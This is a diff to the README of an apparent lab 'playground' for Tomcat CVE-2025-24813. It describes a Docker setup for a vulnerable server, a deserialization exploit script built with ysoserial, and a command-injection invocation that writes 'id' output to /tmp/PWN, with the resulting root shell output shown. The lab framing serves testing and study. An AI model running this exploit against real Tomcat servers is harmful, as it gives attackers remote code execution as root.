@@ -2,12 +2,19 @@ Tomcat CVE-2025-24813 playground
 ================================
 Exploit was forked from https://github.com/absholi7ly/POC-CVE-2025-24813/blob/main/README.md (did not work for me)
 
+Content
+=======
+1. *ROOT.war* is a minimal app with one servlet including apache-common-3.1 and spawing a session
+2. *ysoserial.jar* taken original from ysoserial repo (https://github.com/frohoff/ysoserial)
+3. *Dockerfile* to build a vulnerable installation
+4. *CVE_2025_24813.py* actual exlploit
+
 Setup
 =====
 Build and run the vulnerable tomcat installation
 ```
 $ docker build -t tomcat-cve-2025-24813 .
-$ docker run --name tomcat-cve-2025-24813 -it -d -p 8081:8080 tomcat-cve-2025-24813
+$ docker run --name tomcat-cve-2025-24813 -it -d -p 8080:8080 tomcat-cve-2025-24813
 ```
 
 Exploit
@@ -36,6 +43,6 @@ $ python CVE_2025_24813.py --command 'bash -c echo${IFS}$(id)>/tmp/PWN'  http://
 Check (after exploit)
 =====
 ```
-$ podman exec tomcat-10.0.2-cve cat /tmp/PWN
+$ podman exec tomcat-cve-2025-24813 cat /tmp/PWN
 uid=0(root) gid=0(root) groups=0(root)
 ```
